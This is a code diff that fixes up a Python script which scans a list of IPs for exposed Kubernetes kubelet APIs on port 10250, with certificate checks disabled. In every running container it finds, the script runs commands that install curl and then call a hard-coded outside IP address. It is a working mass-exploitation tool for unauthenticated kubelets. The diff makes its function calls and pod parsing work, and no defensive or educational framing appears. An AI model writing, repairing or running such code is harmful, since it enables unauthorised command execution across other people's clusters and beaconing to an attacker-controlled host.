@@ -1,10 +1,12 @@
 import requests
 import json
 import sys
+import traceback
+import time
 
 
 def run_cmd(ip, namespace, name, container_name, cmd):
-    req = requests.post(f"https://{ip}:10250/run/{namespace}/{name}/{container_name}?cmd={cmd}")
+    req = requests.post(f"https://{ip}:10250/run/{namespace}/{name}/{container_name}?cmd={cmd}", verify=False)
     if req.status_code == 200:
         print("Ran successfully, here's the output")
         print(req.text)
@@ -14,17 +16,26 @@ def run_cmd(ip, namespace, name, container_name, cmd):
     time.sleep(5)
 
 # read file from stdin
-ip_file = open(sys.argv[1], 'r').read()
+ip_file = open(sys.argv[1], 'r').read().split('\n')
 for i in ip_file:
     # try to find running pods
-    pods = requests.get(f"https://{i}:10250/runningpods/")
+    pods = requests.get(f"https://{i}:10250/runningpods/", verify=False)
     if pods.status_code == 200:
         resp = pods.json()
-        for i in resp['items']:
-            name = i['name']
-            namespace = i['namespace']
-            container_name = i['spec']['containers'][0]['name']
-            # execute same thing in them
-            run_cmd("/bin/apt-get update")
-            run_cmd("/bin/apt-get install -y curl")
-            run_cmd("/bin/curl -v http://205.134.240.43:8001/")
+        try:
+            for item in resp['items']:
+                name = item['metadata']['name']
+                namespace = item['metadata']['namespace']
+                container_name = item['spec']['containers'][0]['name']
+                # execute same thing in them
+                run_cmd(i, namespace, name, container_name, "/bin/apt-get update")
+                run_cmd(i, namespace, name, container_name, "/bin/apt-get install -y curl")
+                run_cmd(i, namespace, name, container_name, "/bin/curl -v http://205.134.240.43:8001/")
+        except:
+            print("Something went wrong")
+            print(traceback.format_exc())
+            sys.exit(1)
+    else:
+        print("Something went wrong")
+        print(pods.text)
+
